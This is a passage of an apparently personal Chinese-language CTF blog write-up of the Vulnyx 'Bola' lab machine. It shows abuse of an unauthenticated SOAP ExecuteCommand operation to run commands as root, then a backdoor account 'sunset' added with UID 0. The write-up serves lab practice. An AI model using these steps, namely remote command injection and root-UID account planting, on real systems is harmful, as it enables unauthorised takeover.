class=\"hljs-string\">\"literal\"</span>/></span>\n         <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">output</span>></span>\n      <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">operation</span>></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">binding</span>></span>\n\n   <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">service</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"VulNyxSOAP\"</span>></span>\n      <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">port</span> <span class=\"hljs-attr\">binding</span>=<span class=\"hljs-string\">\"tns:VulNyxSOAPBinding\"</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"VulNyxSOAPPort\"</span>></span>\n         <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">soap:address</span> <span class=\"hljs-attr\">location</span>=<span class=\"hljs-string\">\"http://localhost:9000/wsdl/\"</span> /></span>\n      <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">port</span>></span>\n   <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">service</span>></span>\n<span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">definitions</span>></span> 如何构造请求\n</code></pre>\n<p>看见<code>VulNyxSOAP.wsdl</code> ，构造链接<code>http://bola.nyx:1234/wsdl/VulNyxSOAP.wsdl</code> ，再抓包</p>\n<p>丢到<code>WSDLer</code>中解析，能发现有<code>Login</code>和<code>ExecuteCommand</code>两种行为</p>\n<p><img src=\"/post-images/VulnyxBola/image11.png\" alt=\"image.png\"></p>\n<p>我们将<code>ExecuteCommand</code> 发送到重放器（<code>Repeater</code>）进行测试，在<code>cmd</code>处输入<code>id</code> ，成功执行，还是<code>root</code>权限</p>\n<p><img src=\"/post-images/VulnyxBola/image12.png\" alt=\"image.png\"></p>\n<h2>RootFlag &#x26; UserFlag</h2>\n<p><code>userflag</code>其实在<code>ssh</code>上去的时候的就可以拿了</p>\n<p>我们直接通过命令执行直接读取<code>RootFlag</code> &#x26; <code>UserFlag</code></p>\n<p><img src=\"/post-images/VulnyxBola/image13.png\" alt=\"image.png\"></p>\n<h2>获得shell的方法</h2>\n<p>这里使用添加用户的方法</p>\n<p>添加用户<code>sunset</code>，密码<code>123456</code></p>\n<p><img src=\"/post-images/VulnyxBola/image14.png\" alt=\"image.png\"></p>\n<p>查看是否成功，可以看到已经创建了</p>\n<pre><code class=\"hljs language-xml\">d4t4s3c@bola:~$ tail -n 1 /etc/passwd\nsunset:zSZ7Whrr8hgwY:0:0:root:/root:/usr/bin/bash\n</code></pre>\n<p>切换到<code>sunset</code>用户即可获得<code>rootshell</code></p>\n<pre><code class=\"hljs language-xml\">d4t4s3c@bola:~$ su sunset\nPassword: \nroot@bola:/home/d4t4s3c# \n</code></pre>","title":"Vulnyx - Bola","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["Vulnyx","Linux靶机"],"categories":"靶机"},"recentPosts":[{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"},{"id":"HackTheBoxMachine - Strutted","title":"HackTheBox - Machine - Strutted","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"06","day":"02"}]},"__N_SSG":true}